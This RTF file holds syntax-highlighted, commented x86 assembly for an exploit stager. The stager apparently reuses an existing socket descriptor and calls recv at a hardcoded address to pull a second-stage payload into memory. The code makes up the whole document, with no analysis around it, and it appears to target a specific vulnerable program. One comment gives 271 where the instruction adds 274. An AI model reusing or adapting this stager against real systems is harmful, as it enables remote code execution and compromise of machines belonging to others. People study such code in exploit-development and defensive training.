{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red186\green33\blue33;\red25\green23\blue124;\red255\green0\blue0;\red64\green128\blue128;\red0\green0\blue255;\red0\green128\blue0;\red170\green34\blue255;\red102\green102\blue102;\red136\green136\blue136;\red136\green0\blue0;\red176\green0\blue64;\red160\green0\blue0;\red128\green0\blue128;\red0\green68\blue221;\red153\green153\blue153;\red0\green160\blue0;\red160\green160\blue0;\red187\green187\blue187;\red0\green0\blue128;\red125\green144\blue41;\red187\green102\blue136;\red187\green102\blue34;\red188\green122\blue0;\red210\green65\blue58;}\f0{\cf5 SUB} {\cf6 ESP},{\cf8 64} {\chbrdr\chcfpat3 #}{\cf2 stops} {\cf2 us} {\cf2 ovewriting} {\cf2 our} {\cf2 stager}\par
{\cf5 PUSH} {\cf6 ESP} {\chbrdr\chcfpat3 #}{\cf2 pushes} {\cf2 this} {\cf2 value} {\cf2 to} {\cf2 stack}\par
{\cf5 POP} {\cf6 ECX} {\chbrdr\chcfpat3 #}{\cf2 pops} {\cf2 value} {\cf2 of} {\cf6 ECX}\par
{\cf5 ADD} {\cf6 CX},{\cf8 274} {\chbrdr\chcfpat3 #}{\cf2 adds} {\cf8 271} {\cf2 to} {\cf2 get} {\cf2 to} {\cf6 cl}{\cf2 osest} {\cf2 addresses} {\cf2 this} {\cf2 is} {\cf2 to} {\cf2 add} {\cf2 address} {\cf2 of} {\cf2 socket} {\cf2 descriptor} {\cf2 to} {\cf2 stack} {\cf8 -} {\cf8 0022}{\cf2 FDA9}\par
{\cf5 XOR} {\cf6 EBX},{\cf6 EBX}  {\chbrdr\chcfpat3 #}{\cf2 sets} {\cf2 value} {\cf2 of} {\cf2 flags} {\cf2 to} {\cf2 zero}\par
{\cf5 PUSH} {\cf6 EBX} {\chbrdr\chcfpat3 #}{\cf2 pushes} {\cf2 flag} ({\cf2 PARAMETER} {\cf2 ONE}) {\cf2 onto} {\cf2 stack}\par
{\cf5 ADD} {\cf6 BH},{\cf8 4} {\chbrdr\chcfpat3 #}{\cf2 ADDS} {\cf8 4} {\cf2 to} {\cf2 lowest} {\cf8 8} {\cf2 bits} {\cf2 of} {\cf6 ebx}\par
{\cf5 PUSH} {\cf6 EBX} {\chbrdr\chcfpat3 #}{\cf2 pushes} {\cf6 ebx} {\cf2 onto} {\cf2 stack} ({\cf2 PARAMETER} {\cf2 TWO})\par
{\cf5 SHR} {\cf6 EBP},{\cf8 8} {\chbrdr\chcfpat3 #}{\cf2 Moves} {\cf2 value} {\cf2 in} {\cf6 EBP}, {\cf2 that} {\cf2 we} {\cf2 injected} {\cf2 in} {\cf2 our} {\cf2 preamble}, {\cf8 22}{\cf2 FBC609}, {\cf2 to} {\cf2 remove} {\cf8 09} {\cf2 and} {\cf2 create}  {\cf2 desired} {\cf2 utput} {\cf8 0022}{\cf2 FBC6}\par
{\cf5 PUSH} {\cf6 EBP} {\chbrdr\chcfpat3 #}{\cf2 pushes} {\cf6 ebp} {\cf2 onto} {\cf2 stack} ({\cf2 PARAMETER} {\cf2 THREE})\par
{\cf5 XOR} {\cf6 EBX},{\cf6 EBX} {\chbrdr\chcfpat3 #}{\cf2 makes} {\cf6 EBX} {\cf2 zero} {\cf2 again}\par
{\cf5 MOV} {\cf6 EBX},{\cf8 4023}{\cf2 A090} {\chbrdr\chcfpat3 #}{\cf2 moves} {\cf2 location} {\cf2 of} {\cf2 call} ({\cf8 4023}{\cf2 A090}) {\cf2 onto} {\cf2 stack}\par
{\cf5 SHR} {\cf6 EBX},{\cf8 8} {\chbrdr\chcfpat3 #}{\cf2 creates} {\cf2 desired} {\cf6 ebx} {\cf2 parameter} {\cf2 of} {\cf8 004023}{\cf2 A0}\par
{\cf5 PUSH} {\cf11 DWORD} {\cf2 PTR} {\cf6 DS}:[{\cf6 ECX}] {\chbrdr\chcfpat3 #}{\cf2 pushes} {\cf2 socket} {\cf2 descriptor} ({\cf2 the} {\cf2 one} {\cf2 set} {\cf2 with} {\cf6 cx},{\cf8 274}) {\cf2 onto} {\cf2 stack}\par
{\cf5 CALL} {\cf6 EBX} {\chbrdr\chcfpat3 #}{\cf2 calls} {\cf6 EBX}, {\cf2 which} {\cf2 contains} {\cf2 location} {\cf2 of} {\cf2 win32.recv}\par
{\cf5 NOP}\par
{\cf5 NOP}\par
{\cf5 NOP}\par
{\cf5 NOP}\par
{\cf5 NOP}\par
}